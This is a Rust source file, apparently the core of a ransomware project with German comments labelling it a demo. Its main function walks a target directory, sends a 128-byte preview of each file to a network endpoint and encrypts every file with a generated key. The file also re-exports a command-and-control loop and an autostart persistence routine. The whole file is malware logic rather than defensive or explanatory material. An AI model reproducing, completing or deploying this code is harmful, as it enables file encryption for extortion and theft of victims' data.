pub mod background;
pub mod crypto;
pub mod network;
pub mod persistence;

use anyhow::{Context, Result};
use std::fs::File;
use std::io::Read;
use std::path::{Path, PathBuf};
use walkdir::WalkDir;

// --- Helper Functions ---

fn read_file_preview(path: &Path, size: usize) -> Result<Vec<u8>> {
    let mut file = File::open(path)?;
    let mut buffer = vec![0u8; size];
    let count = file.read(&mut buffer)?;
    buffer.truncate(count);
    Ok(buffer)
}

/// Führt den Hauptangriff (Demo) auf das Zielverzeichnis aus.
/// Generiert Key, durchsucht Ordner, exfiltriert Daten und verschlüsselt.
pub fn run_malware_logic(target_dir: &str) -> Result<String> {
    let root_path = PathBuf::from(target_dir);
    if !root_path.exists() {
        anyhow::bail!("Zielverzeichnis existiert nicht: {}", target_dir);
    }

    // 1. Key Generierung
    let key = crypto::generate_and_save_key(&root_path)?;
    let iv = [0u8; 16]; // Statischer IV für Demo-Zwecke (in Realität zufällig!)

    let mut log = String::new();
    log.push_str(&format!("Starte Vorgang in {:?}\n", root_path));

    // 2. Dateisystem traversieren
    let walker = WalkDir::new(&root_path)
        .into_iter()
        .filter_map(|e| e.ok())
        .filter(|e| e.file_type().is_file());

    for entry in walker {
        let path = entry.path();

        // Eigene Dateien ignorieren
        if path.ends_with("rescue.key")
            || path
                .extension()
                .map_or(false, |e| e == "locked" || e == "enc_temp")
        {
            continue;
        }

        // 3. Exfiltration (Nur Preview senden, um Bandbreite zu sparen)
        if let Ok(content) = read_file_preview(path, 128) {
            // Hardcoded IP für Demo, idealerweise konfigurierbar
            network::exfiltrate_data(&content, "127.0.0.1:4444");
        }

        // 4. Verschlüsselung
        match crypto::encrypt_file_atomic(path, &key, &iv) {
            Ok(_) => log.push_str(&format!("Verschlüsselt: {:?}\n", path.file_name())),
            Err(e) => log.push_str(&format!("Fehler bei {:?}: {}\n", path, e)),
        }
    }

    Ok(log)
}

// Re-Export für einfache Nutzung in main.rs
pub use network::start_c2_loop;
pub use persistence::enable_autostart;
